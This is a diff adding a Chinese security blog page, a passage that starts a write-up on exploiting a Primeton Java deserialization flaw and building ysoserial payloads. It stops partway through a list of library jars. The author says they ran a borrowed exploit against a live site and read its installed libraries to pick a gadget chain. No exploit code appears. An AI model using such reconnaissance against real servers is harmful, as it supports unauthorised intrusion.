@@ -1,0 +1,1654 @@
+<!DOCTYPE HTML>
+<html lang="zh-CN">
+
+
+<head>
+    <meta charset="utf-8">
+    <meta name="keywords" content="普元反序列化漏洞复现探究以及ysoserial各种工具编译鉴赏, peiqiF4ck github">
+    <meta name="description" content="漏洞复现或者exp编写java反序列化工具使用和编译">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
+    <meta name="renderer" content="webkit|ie-stand|ie-comp">
+    <meta name="mobile-web-app-capable" content="yes">
+    <meta name="format-detection" content="telephone=no">
+    <meta name="apple-mobile-web-app-capable" content="yes">
+    <meta name="apple-mobile-web-app-status-bar-style" content="black-translucent">
+    <meta name="referrer" content="no-referrer-when-downgrade">
+    <!-- Global site tag (gtag.js) - Google Analytics -->
+
+
+    <title>普元反序列化漏洞复现探究以及ysoserial各种工具编译鉴赏 | peiqiF4ck</title>
+    <link rel="icon" type="image/png" href="/favicon.png">
+
+    <link rel="stylesheet" type="text/css" href="/libs/awesome/css/all.min.css">
+    <link rel="stylesheet" type="text/css" href="/libs/materialize/materialize.min.css">
+    <link rel="stylesheet" type="text/css" href="/libs/aos/aos.css">
+    <link rel="stylesheet" type="text/css" href="/libs/animate/animate.min.css">
+    <link rel="stylesheet" type="text/css" href="/libs/lightGallery/css/lightgallery.min.css">
+    <link rel="stylesheet" type="text/css" href="/css/matery.css">
+    <link rel="stylesheet" type="text/css" href="/css/my.css">
+
+    <script src="/libs/jquery/jquery-3.6.0.min.js"></script>
+
+<meta name="generator" content="Hexo 6.0.0"></head>
+
+
+
+
+<body>
+    <header class="navbar-fixed">
+    <nav id="headNav" class="bg-color nav-transparent">
+        <div id="navContainer" class="nav-wrapper container">
+            <div class="brand-logo">
+                <a href="/" class="waves-effect waves-light">
+                    
+                    <img src="/medias/logo.png" class="logo-img" alt="LOGO">
+                    
+                    <span class="logo-span">peiqiF4ck</span>
+                </a>
+            </div>
+            
+
+<a href="#" data-target="mobile-nav" class="sidenav-trigger button-collapse"><i class="fas fa-bars"></i></a>
+<ul class="right nav-menu">
+  
+  <li class="hide-on-med-and-down nav-item">
+    
+    <a href="/" class="waves-effect waves-light">
+      
+      <i class="fas fa-home" style="zoom: 0.6;"></i>
+      
+      <span>首页</span>
+    </a>
+    
+  </li>
+  
+  <li class="hide-on-med-and-down nav-item">
+    
+    <a href="/tags" class="waves-effect waves-light">
+      
+      <i class="fas fa-tags" style="zoom: 0.6;"></i>
+      
+      <span>标签</span>
+    </a>
+    
+  </li>
+  
+  <li class="hide-on-med-and-down nav-item">
+    
+    <a href="/categories" class="waves-effect waves-light">
+      
+      <i class="fas fa-bookmark" style="zoom: 0.6;"></i>
+      
+      <span>分类</span>
+    </a>
+    
+  </li>
+  
+  <li class="hide-on-med-and-down nav-item">
+    
+    <a href="/archives" class="waves-effect waves-light">
+      
+      <i class="fas fa-archive" style="zoom: 0.6;"></i>
+      
+      <span>归档</span>
+    </a>
+    
+  </li>
+  
+  <li class="hide-on-med-and-down nav-item">
+    
+    <a href="/about" class="waves-effect waves-light">
+      
+      <i class="fas fa-user-circle" style="zoom: 0.6;"></i>
+      
+      <span>关于</span>
+    </a>
+    
+  </li>
+  
+  <li>
+    <a href="#searchModal" class="modal-trigger waves-effect waves-light">
+      <i id="searchIcon" class="fas fa-search" title="搜索" style="zoom: 0.85;"></i>
+    </a>
+  </li>
+</ul>
+
+
+<div id="mobile-nav" class="side-nav sidenav">
+
+    <div class="mobile-head bg-color">
+        
+        <img src="/medias/logo.png" class="logo-img circle responsive-img">
+        
+        <div class="logo-name">peiqiF4ck</div>
+        <div class="logo-desc">
+            
+            网络安全,代码审计
+            
+        </div>
+    </div>
+
+    <ul class="menu-list mobile-menu-list">
+        
+        <li class="m-nav-item">
+	  
+		<a href="/" class="waves-effect waves-light">
+			
+			    <i class="fa-fw fas fa-home"></i>
+			
+			首页
+		</a>
+          
+        </li>
+        
+        <li class="m-nav-item">
+	  
+		<a href="/tags" class="waves-effect waves-light">
+			
+			    <i class="fa-fw fas fa-tags"></i>
+			
+			标签
+		</a>
+          
+        </li>
+        
+        <li class="m-nav-item">
+	  
+		<a href="/categories" class="waves-effect waves-light">
+			
+			    <i class="fa-fw fas fa-bookmark"></i>
+			
+			分类
+		</a>
+          
+        </li>
+        
+        <li class="m-nav-item">
+	  
+		<a href="/archives" class="waves-effect waves-light">
+			
+			    <i class="fa-fw fas fa-archive"></i>
+			
+			归档
+		</a>
+          
+        </li>
+        
+        <li class="m-nav-item">
+	  
+		<a href="/about" class="waves-effect waves-light">
+			
+			    <i class="fa-fw fas fa-user-circle"></i>
+			
+			关于
+		</a>
+          
+        </li>
+        
+        
+        <li><div class="divider"></div></li>
+        <li>
+            <a href="https://github.com/peiqiF4ck" class="waves-effect waves-light" target="_blank">
+                <i class="fab fa-github-square fa-fw"></i>Fork Me
+            </a>
+        </li>
+        
+    </ul>
+</div>
+
+
+        </div>
+
+        
+            <style>
+    .nav-transparent .github-corner {
+        display: none !important;
+    }
+
+    .github-corner {
+        position: absolute;
+        z-index: 10;
+        top: 0;
+        right: 0;
+        border: 0;
+        transform: scale(1.1);
+    }
+
+    .github-corner svg {
+        color: #0f9d58;
+        fill: #fff;
+        height: 64px;
+        width: 64px;
+    }
+
+    .github-corner:hover .octo-arm {
+        animation: a 0.56s ease-in-out;
+    }
+
+    .github-corner .octo-arm {
+        animation: none;
+    }
+
+    @keyframes a {
+        0%,
+        to {
+            transform: rotate(0);
+        }
+        20%,
+        60% {
+            transform: rotate(-25deg);
+        }
+        40%,
+        80% {
+            transform: rotate(10deg);
+        }
+    }
+</style>
+
+<a href="https://github.com/peiqiF4ck" class="github-corner tooltipped hide-on-med-and-down" target="_blank"
+   data-tooltip="Fork Me" data-position="left" data-delay="50">
+    <svg viewBox="0 0 250 250" aria-hidden="true">
+        <path d="M0,0 L115,115 L130,115 L142,142 L250,250 L250,0 Z"></path>
+        <path d="M128.3,109.0 C113.8,99.7 119.0,89.6 119.0,89.6 C122.0,82.7 120.5,78.6 120.5,78.6 C119.2,72.0 123.4,76.3 123.4,76.3 C127.3,80.9 125.5,87.3 125.5,87.3 C122.9,97.6 130.6,101.9 134.4,103.2"
+              fill="currentColor" style="transform-origin: 130px 106px;" class="octo-arm"></path>
+        <path d="M115.0,115.0 C114.9,115.1 118.7,116.5 119.8,115.4 L133.7,101.6 C136.9,99.2 139.9,98.4 142.2,98.6 C133.8,88.0 127.5,74.4 143.8,58.0 C148.5,53.4 154.0,51.2 159.7,51.0 C160.3,49.4 163.2,43.6 171.4,40.1 C171.4,40.1 176.1,42.5 178.8,56.2 C183.1,58.6 187.2,61.8 190.9,65.4 C194.5,69.0 197.7,73.2 200.1,77.6 C213.8,80.2 216.3,84.9 216.3,84.9 C212.7,93.1 206.9,96.0 205.4,96.6 C205.1,102.4 203.0,107.8 198.3,112.5 C181.9,128.9 168.3,122.5 157.7,114.1 C157.9,116.9 156.7,120.9 152.7,124.9 L141.0,136.5 C139.8,137.7 141.6,141.9 141.8,141.8 Z"
+              fill="currentColor" class="octo-body"></path>
+    </svg>
+</a>
+        
+    </nav>
+
+</header>
+
+    
+<script src="/libs/cryptojs/crypto-js.min.js"></script>
+<script>
+    (function() {
+        let pwd = '';
+        if (pwd && pwd.length > 0) {
+            if (pwd !== CryptoJS.SHA256(prompt('请输入访问本文章的密码')).toString(CryptoJS.enc.Hex)) {
+                alert('密码错误，将返回主页！');
+                location.href = '/';
+            }
+        }
+    })();
+</script>
+
+
+
+
+<div class="bg-cover pd-header post-cover" style="background-image: url('https://cdn.jsdelivr.net/gh/peiqiF4ck/mybologimg/img/202404301522728.png')">
+    <div class="container" style="right: 0px;left: 0px;">
+        <div class="row">
+            <div class="col s12 m12 l12">
+                <div class="brand">
+                    <h1 class="description center-align post-title">普元反序列化漏洞复现探究以及ysoserial各种工具编译鉴赏</h1>
+                </div>
+            </div>
+        </div>
+    </div>
+</div>
+
+
+
+
+<main class="post-container content">
+
+    
+    <link rel="stylesheet" href="/libs/tocbot/tocbot.css">
+<style>
+    #articleContent h1::before,
+    #articleContent h2::before,
+    #articleContent h3::before,
+    #articleContent h4::before,
+    #articleContent h5::before,
+    #articleContent h6::before {
+        display: block;
+        content: " ";
+        height: 100px;
+        margin-top: -100px;
+        visibility: hidden;
+    }
+
+    #articleContent :focus {
+        outline: none;
+    }
+
+    .toc-fixed {
+        position: fixed;
+        top: 64px;
+    }
+
+    .toc-widget {
+        width: 345px;
+        padding-left: 20px;
+    }
+
+    .toc-widget .toc-title {
+        padding: 35px 0 15px 17px;
+        font-size: 1.5rem;
+        font-weight: bold;
+        line-height: 1.5rem;
+    }
+
+    .toc-widget ol {
+        padding: 0;
+        list-style: none;
+    }
+
+    #toc-content {
+        padding-bottom: 30px;
+        overflow: auto;
+    }
+
+    #toc-content ol {
+        padding-left: 10px;
+    }
+
+    #toc-content ol li {
+        padding-left: 10px;
+    }
+
+    #toc-content .toc-link:hover {
+        color: #42b983;
+        font-weight: 700;
+        text-decoration: underline;
+    }
+
+    #toc-content .toc-link::before {
+        background-color: transparent;
+        max-height: 25px;
+
+        position: absolute;
+        right: 23.5vw;
+        display: block;
+    }
+
+    #toc-content .is-active-link {
+        color: #42b983;
+    }
+
+    #floating-toc-btn {
+        position: fixed;
+        right: 15px;
+        bottom: 76px;
+        padding-top: 15px;
+        margin-bottom: 0;
+        z-index: 998;
+    }
+
+    #floating-toc-btn .btn-floating {
+        width: 48px;
+        height: 48px;
+    }
+
+    #floating-toc-btn .btn-floating i {
+        line-height: 48px;
+        font-size: 1.4rem;
+    }
+</style>
+<div class="row">
+    <div id="main-content" class="col s12 m12 l9">
+        <!-- 文章内容详情 -->
+<div id="artDetail">
+    <div class="card">
+        <div class="card-content article-info">
+            <div class="row tag-cate">
+                <div class="col s7">
+                    
+                    <div class="article-tag">
+                        
+                            <a href="/tags/PenetrationTestingExample/">
+                                <span class="chip bg-color">PenetrationTestingExample</span>
+                            </a>
+                        
+                    </div>
+                    
+                </div>
+                <div class="col s5 right-align">
+                    
+                    <div class="post-cate">
+                        <i class="fas fa-bookmark fa-fw icon-category"></i>
+                        
+                            <a href="/categories/PenetrationTest/" class="post-category">
+                                PenetrationTest
+                            </a>
+                        
+                    </div>
+                    
+                </div>
+            </div>
+
+            <div class="post-info">
+                
+                <div class="post-date info-break-policy">
+                    <i class="far fa-calendar-minus fa-fw"></i>发布日期:&nbsp;&nbsp;
+                    2024-04-29
+                </div>
+                
+
+                
+                <div class="post-date info-break-policy">
+                    <i class="far fa-calendar-check fa-fw"></i>更新日期:&nbsp;&nbsp;
+                    2024-04-30
+                </div>
+                
+
+                
+                <div class="info-break-policy">
+                    <i class="far fa-file-word fa-fw"></i>文章字数:&nbsp;&nbsp;
+                    3.1k
+                </div>
+                
+
+                
+                <div class="info-break-policy">
+                    <i class="far fa-clock fa-fw"></i>阅读时长:&nbsp;&nbsp;
+                    16 分
+                </div>
+                
+
+                
+                    <div id="busuanzi_container_page_pv" class="info-break-policy">
+                        <i class="far fa-eye fa-fw"></i>阅读次数:&nbsp;&nbsp;
+                        <span id="busuanzi_value_page_pv"></span>
+                    </div>
+				
+            </div>
+        </div>
+        <hr class="clearfix">
+
+        
+        <!-- 是否加载使用自带的 prismjs. -->
+        <link rel="stylesheet" href="/libs/prism/prism.css">
+        
+
+        
+
+        <div class="card-content article-card-content">
+            <div id="articleContent">
+                <h2 id="漏洞复现背景"><a href="#漏洞复现背景" class="headerlink" title="漏洞复现背景"></a>漏洞复现背景</h2><p> 前几天翻公众号微步发布通告 <a target="_blank" rel="noopener" href="https://mp.weixin.qq.com/s/DutoC4yeO6_GrzhkZukV0Q">https://mp.weixin.qq.com/s/DutoC4yeO6_GrzhkZukV0Q</a> 说普元存在代码执行漏洞。这时候我看群里和某些小密圈里面poc 都流出来了。一看poc一看就是java反序列化漏洞。那么说到这个。我们需要知道如何构造使用工具java反序列化漏洞利用链。并且得知道这个普元的版本漏洞的版本号是多少我们才可以自定义我们的poc exp 。从而达到攻击的目的。</p>
+<h2 id="使用别人的exp进行攻击"><a href="#使用别人的exp进行攻击" class="headerlink" title="使用别人的exp进行攻击"></a>使用别人的exp进行攻击</h2><p>我们使用别人的exp打一下确定测试站。截图如下:由于为实战环境所以铭感信息都打码。poc url我就不打码了。这个当然是之前的不过都一样。<strong>主要的是遇到java反序列化,我们如何找到利用链构造属于我们自己的exp。这是关键</strong><br><img src="https://cdn.jsdelivr.net/gh/peiqiF4ck/mybologimg/img/202404291656973.png" alt="别人的exp测试"><br>通过上面的exp我们确定这个网站存在漏洞。那么我们如何确定链的我们知道java反序列化漏洞需要依赖 jdk和第三方jar包。那么我们就看看这个网站有哪些jar不就行了。<br>利用他的poc帮助我们找jar 。apache-tomcat-7.0.54\webapps\default\WEB-INF\lib  至于为啥是这个路径这得需要对java项目比较熟悉。这里我就不做介绍了。大家可以自行补充。<br><img src="https://cdn.jsdelivr.net/gh/peiqiF4ck/mybologimg/img/202404291702440.png" alt="jar包截图"><br>我们把这些jar包过滤出来找我们需要的</p>
+<pre class="language-java" data-language="java"><code class="language-java">activation<span class="token operator">-</span><span class="token number">1.1</span><span class="token punctuation">.</span>jar
+alicloudcli<span class="token punctuation">.</span>jar
+ant<span class="token operator">-</span><span class="token number">1.6</span><span class="token number">.1</span><span class="token punctuation">.</span>jar
+antisamy<span class="token operator">-</span><span class="token number">1.5</span><span class="token number">.3</span><span class="token punctuation">.</span>jar
+antlr<span class="token operator">-</span><span class="token number">2.7</span><span class="token number">.6</span><span class="token punctuation">.</span>jar
+aopalliance<span class="token operator">-</span><span class="token number">1.0</span><span class="token punctuation">.</span>jar
+asm<span class="token operator">-</span><span class="token number">1.5</span><span class="token number">.3</span><span class="token punctuation">.</span>jar
+axiom<span class="token operator">-</span>api<span class="token operator">-</span><span class="token number">1.2</span><span class="token number">.5</span><span class="token punctuation">.</span>jar
+axiom<span class="token operator">-</span>dom<span class="token operator">-</span><span class="token number">1.2</span><span class="token number">.5</span><span class="token punctuation">.</span>jar
+axiom<span class="token operator">-</span>impl<span class="token operator">-</span><span class="token number">1.2</span><span class="token number">.5</span><span class="token punctuation">.</span>jar
+axis2<span class="token operator">-</span>adb<span class="token operator">-</span><span class="token number">1.3</span><span class="token punctuation">.</span>jar
+axis2<span class="token operator">-</span>codegen<span class="token operator">-</span><span class="token number">1.3</span><span class="token punctuation">.</span>jar
+axis2<span class="token operator">-</span>kernel<span class="token operator">-</span><span class="token number">1.3</span><span class="token punctuation">.</span>jar
+backport<span class="token operator">-</span>util<span class="token operator">-</span>concurrent<span class="token operator">-</span><span class="token number">2.2</span><span class="token punctuation">.</span>jar
+batik<span class="token operator">-</span>anim<span class="token punctuation">.</span>jar
+batik<span class="token operator">-</span>awt<span class="token operator">-</span>util<span class="token punctuation">.</span>jar
+batik<span class="token operator">-</span>bridge<span class="token punctuation">.</span>jar
+batik<span class="token operator">-</span>codec<span class="token punctuation">.</span>jar
+batik<span class="token operator">-</span>css<span class="token operator">-</span><span class="token number">1.6</span><span class="token number">.1</span><span class="token punctuation">.</span>jar
+batik<span class="token operator">-</span>css<span class="token punctuation">.</span>jar
+batik<span class="token operator">-</span>dom<span class="token punctuation">.</span>jar
+batik<span class="token operator">-</span>ext<span class="token punctuation">.</span>jar
+batik<span class="token operator">-</span>extension<span class="token punctuation">.</span>jar
+batik<span class="token operator">-</span>gui<span class="token operator">-</span>util<span class="token punctuation">.</span>jar
+batik<span class="token operator">-</span>gvt<span class="token punctuation">.</span>jar
+batik<span class="token operator">-</span>parser<span class="token punctuation">.</span>jar
+batik<span class="token operator">-</span>script<span class="token punctuation">.</span>jar
+batik<span class="token operator">-</span>svg<span class="token operator">-</span>dom<span class="token punctuation">.</span>jar
+batik<span class="token operator">-</span>svggen<span class="token punctuation">.</span>jar
+batik<span class="token operator">-</span>swing<span class="token punctuation">.</span>jar
+batik<span class="token operator">-</span>transcoder<span class="token punctuation">.</span>jar
+batik<span class="token operator">-</span>util<span class="token operator">-</span><span class="token number">1.6</span><span class="token number">.1</span><span class="token punctuation">.</span>jar
+batik<span class="token operator">-</span>util<span class="token punctuation">.</span>jar
+batik<span class="token operator">-</span>xml<span class="token punctuation">.</span>jar
+bcprov<span class="token operator">-</span>jdk15<span class="token operator">-</span><span class="token number">1.41</span><span class="token number">.0</span><span class="token punctuation">.</span>jar
+bfs_client<span class="token operator">-</span><span class="token number">0.</span>x<span class="token punctuation">.</span>jar
+bfs_client_eos<span class="token operator">-</span><span class="token number">0.</span>x<span class="token punctuation">.</span>jar
+bfs_common<span class="token operator">-</span><span class="token number">0.</span>x<span class="token punctuation">.</span>jar
+bfs_console<span class="token operator">-</span><span class="token number">0.</span>x<span class="token punctuation">.</span>jar
+bfs_engineall<span class="token operator">-</span><span class="token number">0.</span>x<span class="token punctuation">.</span>jar
+bfs_interface<span class="token operator">-</span><span class="token number">0.</span>x<span class="token punctuation">.</span>jar
+bps<span class="token operator">-</span>integration<span class="token operator">-</span><span class="token number">7.0</span><span class="token number">.1</span><span class="token number">.0</span><span class="token punctuation">.</span>jar
+bps<span class="token operator">-</span>server<span class="token operator">-</span><span class="token number">7.0</span><span class="token number">.1</span><span class="token number">.0</span><span class="token punctuation">.</span>jar
+bps<span class="token operator">-</span>taglib4j<span class="token operator">-</span><span class="token number">7.0</span><span class="token number">.1</span><span class="token number">.0</span><span class="token punctuation">.</span>jar
+bps<span class="token operator">-</span>taskcenter<span class="token operator">-</span>adapter<span class="token operator">-</span><span class="token number">7.0</span><span class="token number">.1</span><span class="token number">.0</span><span class="token punctuation">.</span>jar
+c3p0<span class="token operator">-</span><span class="token number">0.9</span><span class="token number">.0</span><span class="token punctuation">.</span>jar
+cglib<span class="token operator">-</span><span class="token number">2.1</span><span class="token number">.3</span><span class="token punctuation">.</span>jar
+com<span class="token punctuation">.</span>primeton<span class="token punctuation">.</span>bps<span class="token punctuation">.</span>web<span class="token punctuation">.</span>control<span class="token operator">-</span><span class="token number">7.0</span><span class="token number">.1</span><span class="token number">.0</span><span class="token punctuation">.</span>jar
+com<span class="token punctuation">.</span>primeton<span class="token punctuation">.</span>components<span class="token punctuation">.</span>bpff<span class="token punctuation">.</span>base<span class="token operator">-</span><span class="token number">3.0</span><span class="token number">.1</span><span class="token punctuation">.</span>jar
+com<span class="token punctuation">.</span>primeton<span class="token punctuation">.</span>components<span class="token punctuation">.</span>rest<span class="token operator">-</span><span class="token number">3.0</span><span class="token number">.1</span><span class="token punctuation">.</span>jar
+com<span class="token punctuation">.</span>primeton<span class="token punctuation">.</span>components<span class="token punctuation">.</span>taskcenter<span class="token punctuation">.</span>retry<span class="token operator">-</span><span class="token number">3.0</span><span class="token number">.6</span><span class="token punctuation">.</span>jar
+com<span class="token punctuation">.</span>primeton<span class="token punctuation">.</span>components<span class="token punctuation">.</span>taskcenter<span class="token punctuation">.</span>rif<span class="token punctuation">.</span>client<span class="token operator">-</span><span class="token number">3.0</span><span class="token number">.6</span><span class="token punctuation">.</span>jar
+com<span class="token punctuation">.</span>primeton<span class="token punctuation">.</span>components<span class="token punctuation">.</span>taskcenter<span class="token punctuation">.</span>rif<span class="token punctuation">.</span>client<span class="token punctuation">.</span>ext<span class="token operator">-</span><span class="token number">3.0</span><span class="token number">.6</span><span class="token punctuation">.</span>jar
+com<span class="token punctuation">.</span>primeton<span class="token punctuation">.</span>components<span class="token punctuation">.</span>taskcenter<span class="token punctuation">.</span>rif<span class="token punctuation">.</span>server<span class="token operator">-</span><span class="token number">3.0</span><span class="token number">.6</span><span class="token punctuation">.</span>jar
+com<span class="token punctuation">.</span>primeton<span class="token punctuation">.</span>components<span class="token punctuation">.</span>taskcenter<span class="token punctuation">.</span>rpf<span class="token operator">-</span><span class="token number">3.0</span><span class="token number">.6</span><span class="token punctuation">.</span>jar
+commons<span class="token operator">-</span>beanutils<span class="token operator">-</span><span class="token number">1.6</span><span class="token number">.1</span><span class="token punctuation">.</span>jar
+commons<span class="token operator">-</span>codec<span class="token operator">-</span><span class="token number">1.2</span><span class="token punctuation">.</span>jar
+commons<span class="token operator">-</span>codec<span class="token operator">-</span><span class="token number">1.3</span><span class="token punctuation">.</span>jar
+commons<span class="token operator">-</span>collections<span class="token operator">-</span><span class="token number">3.2</span><span class="token punctuation">.</span>jar
+commons<span class="token operator">-</span>collections4<span class="token operator">-</span><span class="token number">4.1</span><span class="token punctuation">.</span>jar
+commons<span class="token operator">-</span>compress<span class="token operator">-</span><span class="token number">1.12</span><span class="token punctuation">.</span>jar
+commons<span class="token operator">-</span>configuration<span class="token operator">-</span><span class="token number">1.3</span><span class="token punctuation">.</span>jar
+commons<span class="token operator">-</span>dbcp<span class="token operator">-</span><span class="token number">1.3</span><span class="token punctuation">.</span>jar
+commons<span class="token operator">-</span>digester<span class="token operator">-</span><span class="token number">1.8</span><span class="token punctuation">.</span>jar
+commons<span class="token operator">-</span>email<span class="token operator">-</span><span class="token number">1.1</span><span class="token punctuation">.</span>jar
+commons<span class="token operator">-</span>fileupload<span class="token operator">-</span><span class="token number">1.1</span><span class="token number">.1</span><span class="token punctuation">.</span>jar
+commons<span class="token operator">-</span>fileupload<span class="token operator">-</span><span class="token number">1.2</span><span class="token number">.1</span><span class="token punctuation">.</span>jar
+commons<span class="token operator">-</span>httpclient<span class="token operator">-</span><span class="token number">3.0</span><span class="token punctuation">.</span>jar
+commons<span class="token operator">-</span>io<span class="token operator">-</span><span class="token number">1.3</span><span class="token punctuation">.</span>jar
+commons<span class="token operator">-</span>io<span class="token operator">-</span><span class="token number">1.4</span><span class="token punctuation">.</span>jar
+commons<span class="token operator">-</span>jexl<span class="token operator">-</span><span class="token number">1.1</span><span class="token number">.1</span><span class="token punctuation">.</span>jar
+commons<span class="token operator">-</span>jxpath<span class="token operator">-</span><span class="token number">1.2</span><span class="token punctuation">.</span>jar
+commons<span class="token operator">-</span>lang<span class="token operator">-</span><span class="token number">2.1</span><span class="token punctuation">.</span>jar
+commons<span class="token operator">-</span>logging<span class="token operator">-</span><span class="token number">1.0</span><span class="token number">.4</span><span class="token punctuation">.</span>jar
+commons<span class="token operator">-</span>math<span class="token operator">-</span><span class="token number">1.0</span><span class="token punctuation">.</span>jar
+commons<span class="token operator">-</span>pool<span class="token operator">-</span><span class="token number">1.2</span><span class="token punctuation">.</span>jar
+commons<span class="token operator">-</span>pool<span class="token punctuation">.</span>jar
+commons<span class="token operator">-</span>vfs<span class="token operator">-</span><span class="token number">1.0</span><span class="token punctuation">.</span>jar
+core4wl<span class="token punctuation">.</span>jar
+cos<span class="token operator">-</span><span class="token number">0.</span>x<span class="token punctuation">.</span>jar
+datalogic<span class="token punctuation">.</span>jar
+datastaxcli<span class="token punctuation">.</span>jar
+datetimeformat<span class="token punctuation">.</span>jar
+dm<span class="token punctuation">.</span>jar
+dmgraph<span class="token punctuation">.</span>jar
+dm_report<span class="token punctuation">.</span>jar
+dom4j<span class="token operator">-</span><span class="token number">1.6</span><span class="token number">.1</span><span class="token punctuation">.</span>jar
+ecj<span class="token operator">-</span><span class="token number">4.2</span><span class="token number">.1</span><span class="token punctuation">.</span>jar
+eigenbase<span class="token operator">-</span>properties<span class="token operator">-</span><span class="token number">1.1</span><span class="token number">.0</span><span class="token punctuation">.</span>jar
+eigenbase<span class="token operator">-</span>resgen<span class="token operator">-</span><span class="token number">1.3</span><span class="token number">.0</span><span class="token punctuation">.</span>jar
+eigenbase<span class="token operator">-</span>xom<span class="token operator">-</span><span class="token number">1.3</span><span class="token number">.0</span><span class="token punctuation">.</span>jar
+eos<span class="token operator">-</span>server<span class="token operator">-</span>access<span class="token operator">-</span><span class="token number">7.1</span><span class="token number">.4</span><span class="token number">.0</span><span class="token punctuation">.</span>jar
+eos<span class="token operator">-</span>server<span class="token operator">-</span>access<span class="token operator">-</span>ejb<span class="token operator">-</span><span class="token number">7.1</span><span class="token number">.4</span><span class="token number">.0</span><span class="token punctuation">.</span>jar
+eos<span class="token operator">-</span>server<span class="token operator">-</span>common<span class="token operator">-</span><span class="token number">7.1</span><span class="token number">.4</span><span class="token number">.0</span><span class="token punctuation">.</span>jar
+eos<span class="token operator">-</span>server<span class="token operator">-</span>das<span class="token operator">-</span><span class="token number">7.1</span><span class="token number">.4</span><span class="token number">.0</span><span class="token punctuation">.</span>jar
+eos<span class="token operator">-</span>server<span class="token operator">-</span>data<span class="token operator">-</span><span class="token number">7.1</span><span class="token number">.4</span><span class="token number">.0</span><span class="token punctuation">.</span>jar
+eos<span class="token operator">-</span>server<span class="token operator">-</span>engine<span class="token operator">-</span><span class="token number">7.1</span><span class="token number">.4</span><span class="token number">.0</span><span class="token punctuation">.</span>jar
+eos<span class="token operator">-</span>server<span class="token operator">-</span>runtime<span class="token operator">-</span><span class="token number">7.1</span><span class="token number">.4</span><span class="token number">.0</span><span class="token punctuation">.</span>jar
+eos<span class="token operator">-</span>server<span class="token operator">-</span>sca<span class="token operator">-</span><span class="token number">7.1</span><span class="token number">.4</span><span class="token number">.0</span><span class="token punctuation">.</span>jar
+eos<span class="token operator">-</span>server<span class="token operator">-</span>spring<span class="token operator">-</span><span class="token number">7.1</span><span class="token number">.4</span><span class="token number">.0</span><span class="token punctuation">.</span>jar
+eos<span class="token operator">-</span>server<span class="token operator">-</span>system<span class="token operator">-</span><span class="token number">7.1</span><span class="token number">.4</span><span class="token number">.0</span><span class="token punctuation">.</span>jar
+<span class="token class-name">EOS3Encode</span><span class="token punctuation">.</span>jar
+excel2007<span class="token punctuation">.</span>jar
+excelcli<span class="token punctuation">.</span>jar
+fastjson<span class="token operator">-</span><span class="token number">1.2</span><span class="token number">.5</span><span class="token punctuation">.</span>jar
+fileupload<span class="token operator">-</span>progress<span class="token operator">-</span><span class="token number">0.</span>x<span class="token punctuation">.</span>jar
+ftpcli<span class="token punctuation">.</span>jar
+geronimo<span class="token operator">-</span>commonj_1<span class="token punctuation">.</span><span class="token number">1_</span>spec<span class="token operator">-</span><span class="token number">1.0</span><span class="token punctuation">.</span>jar
+geronimo<span class="token operator">-</span>stax<span class="token operator">-</span>api_1<span class="token punctuation">.</span><span class="token number">0_</span>spec<span class="token operator">-</span><span class="token number">1.0</span><span class="token punctuation">.</span>jar
+guide<span class="token punctuation">.</span>jar
+hbasecli<span class="token punctuation">.</span>jar
+hdfsfilecli<span class="token punctuation">.</span>jar
+hessian<span class="token operator">-</span>jdk1<span class="token punctuation">.</span><span class="token number">4</span><span class="token operator">-</span><span class="token number">3.0</span><span class="token number">.20</span><span class="token punctuation">.</span>jar
+hivecli<span class="token punctuation">.</span>jar
+htmlparser<span class="token operator">-</span><span class="token number">1.6</span><span class="token punctuation">.</span>jar
+httpclient<span class="token operator">-</span><span class="token number">4.2</span><span class="token number">.5</span><span class="token punctuation">.</span>jar
+httpcore<span class="token operator">-</span><span class="token number">4.2</span><span class="token number">.4</span><span class="token punctuation">.</span>jar
+icu4j_3_4_5<span class="token punctuation">.</span>jar
+itext2_rq<span class="token punctuation">.</span>jar
+itext5<span class="token operator">-</span>itextpdf<span class="token operator">-</span><span class="token number">5.5</span><span class="token number">.11</span><span class="token punctuation">.</span>jar
+jackson<span class="token operator">-</span>core<span class="token operator">-</span>asl<span class="token operator">-</span><span class="token number">1.9</span><span class="token number">.12</span><span class="token punctuation">.</span>jar
+jackson<span class="token operator">-</span>jaxrs<span class="token operator">-</span><span class="token number">1.9</span><span class="token number">.12</span><span class="token punctuation">.</span>jar
+jackson<span class="token operator">-</span>mapper<span class="token operator">-</span>asl<span class="token operator">-</span><span class="token number">1.9</span><span class="token number">.12</span><span class="token punctuation">.</span>jar
+jackson<span class="token operator">-</span>xc<span class="token operator">-</span><span class="token number">1.9</span><span class="token number">.12</span><span class="token punctuation">.</span>jar
+jai_codec<span class="token punctuation">.</span>jar
+jai_core<span class="token punctuation">.</span>jar
+javassist<span class="token operator">-</span><span class="token number">3.3</span><span class="token punctuation">.</span>jar
+javax<span class="token punctuation">.</span>ejb<span class="token operator">-</span><span class="token number">2.1</span><span class="token punctuation">.</span>jar
+javax<span class="token punctuation">.</span>jms<span class="token operator">-</span><span class="token number">1.1</span><span class="token punctuation">.</span>jar
+javax<span class="token punctuation">.</span>transaction<span class="token operator">-</span><span class="token number">0.</span>x<span class="token punctuation">.</span>jar
+jaxb<span class="token operator">-</span>api<span class="token operator">-</span><span class="token number">2.1</span><span class="token punctuation">.</span>jar
+jaxb<span class="token operator">-</span>impl<span class="token operator">-</span><span class="token number">2.1</span><span class="token number">.4</span><span class="token punctuation">.</span>jar
+jaxb2<span class="token operator">-</span>reflection<span class="token operator">-</span><span class="token number">2.1</span><span class="token number">.4</span><span class="token punctuation">.</span>jar
+jaxen<span class="token operator">-</span><span class="token number">1.1</span><span class="token number">.1</span><span class="token punctuation">.</span>jar
+jaxrs<span class="token operator">-</span>api<span class="token operator">-</span><span class="token number">3.0</span><span class="token number">.1</span><span class="token punctuation">.</span>jar
+jaxws<span class="token operator">-</span>api<span class="token operator">-</span><span class="token number">2.1</span><span class="token punctuation">.</span>jar
+jdom<span class="token operator">-</span><span class="token number">1.0</span><span class="token punctuation">.</span>jar
+jdom<span class="token punctuation">.</span>jar
+jettison<span class="token operator">-</span><span class="token number">1.0</span><span class="token punctuation">.</span>jar
+js<span class="token operator">-</span><span class="token number">1.7</span>R2<span class="token punctuation">.</span>jar
+js<span class="token punctuation">.</span>jar
+jsobject<span class="token punctuation">.</span>jar
+json<span class="token punctuation">.</span>jar
+json_simple<span class="token operator">-</span><span class="token number">1.1</span><span class="token punctuation">.</span>jar
